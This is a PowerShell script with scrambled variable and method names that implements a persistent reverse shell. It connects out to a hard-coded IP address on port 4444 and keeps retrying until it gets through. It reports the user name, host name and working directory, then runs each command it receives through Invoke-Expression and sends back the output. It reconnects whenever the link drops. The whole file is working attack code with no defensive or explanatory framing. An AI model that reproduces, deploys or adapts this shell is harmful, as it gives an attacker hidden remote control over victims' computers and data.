class HYMEnIB {
    
    [string]$bZsxeUTXrINHgielpzOmDaw = "93.49.240.195"
    [int]$XquvfTmLbRLnIRPq = 4444

    $NCCmgckttLZCpfsnbmGl
    $hULQFKIRROxdfr
    $KzTWESU
    $eLEcCfLDoPoMTMaPtr
    $BvOuYktQDvgJuALWS
    $HWLTLiZlBAJVRXrxbGzEgTb
    [int]$FtNcmMmNeeV = 50*1024

    FWQYQi() {
        $this.hULQFKIRROxdfr = $false
        while ($true) {
            try {
                $this.hULQFKIRROxdfr = New-Object Net.Sockets.TcpClient($this.bZsxeUTXrINHgielpzOmDaw, $this.XquvfTmLbRLnIRPq)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.JNPJCl()
    }

    JNPJCl() {
        $this.NCCmgckttLZCpfsnbmGl = $this.hULQFKIRROxdfr.GetStream()
        $this.eLEcCfLDoPoMTMaPtr = New-Object Byte[] $this.FtNcmMmNeeV
        $this.HWLTLiZlBAJVRXrxbGzEgTb = New-Object Text.UTF8Encoding
        $this.KzTWESU = New-Object IO.StreamWriter($this.NCCmgckttLZCpfsnbmGl, [Text.Encoding]::UTF8, $this.FtNcmMmNeeV)
        $this.BvOuYktQDvgJuALWS = New-Object System.IO.StreamReader($this.NCCmgckttLZCpfsnbmGl)
        $this.KzTWESU.AutoFlush = $true
    }

    sJqQcVTpG() {
        $this.FWQYQi()
        $this.FyXylKNlGYDbKF()
    }

    miuekdZEZtMbtsTlDR($EhjXFqlSNCAh) {
        try {
            [byte[]]$tynhipSWccAUwL = [text.Encoding]::Ascii.GetBytes($EhjXFqlSNCAh)
            $this.KzTWESU.Write($tynhipSWccAUwL, 0, $tynhipSWccAUwL.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.sJqQcVTpG()
        }
    }

    [string] yjtzsU() {
        try {
            $aXdsVvZN = $this.NCCmgckttLZCpfsnbmGl.Read($this.eLEcCfLDoPoMTMaPtr, 0, $this.FtNcmMmNeeV)    
            $bmGMtU = ($this.HWLTLiZlBAJVRXrxbGzEgTb.GetString($this.eLEcCfLDoPoMTMaPtr, 0, $aXdsVvZN))
            return $bmGMtU
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.sJqQcVTpG()
            return ""
        }
    }

    [string] HkiDaVrJctg($taAmwNEOAhQtuUjRz) {
        Write-Host $taAmwNEOAhQtuUjRz
        try { 
            $JUyAFZofdfyZUQgfEO = Invoke-Expression $taAmwNEOAhQtuUjRz | Out-String
        }
        catch {
            $DyFhSBWCTHcuMw = $_.Exception
            $UHknlrquD = $_.Message
            $JUyAFZofdfyZUQgfEO = "`n$_`n"
        }
        return $JUyAFZofdfyZUQgfEO
    }

    [string] JSiEl() {
        $FDnjfrOYbMMSSkwV = [Environment]::UserName
        $JIxqmclJUmLZLfgGGRhCOzA = [System.Net.Dns]::GetHostName()
        $wcogDjJdspEvwKAhupFKelj = Get-Location
        return "$FDnjfrOYbMMSSkwV@$JIxqmclJUmLZLfgGGRhCOzA [$wcogDjJdspEvwKAhupFKelj]~$ "
    }

    FyXylKNlGYDbKF() {
        while ($this.hULQFKIRROxdfr.Connected) {
            $this.miuekdZEZtMbtsTlDR($this.JSiEl())         
            $bmGMtU = $this.yjtzsU()
            $JUyAFZofdfyZUQgfEO = "`n"
            if ([string]::IsNullOrEmpty($bmGMtU)) {
                continue
            }
            $JUyAFZofdfyZUQgfEO = $this.HkiDaVrJctg($bmGMtU)
            $this.miuekdZEZtMbtsTlDR($JUyAFZofdfyZUQgfEO + "`n")
            $this.NCCmgckttLZCpfsnbmGl.Flush()
        }
        $this.hULQFKIRROxdfr.Close()
        $this.sJqQcVTpG()
    } 
}

$SONjSkHsLzsZNGAeqgGI = [HYMEnIB]::new()
$SONjSkHsLzsZNGAeqgGI.sJqQcVTpG()
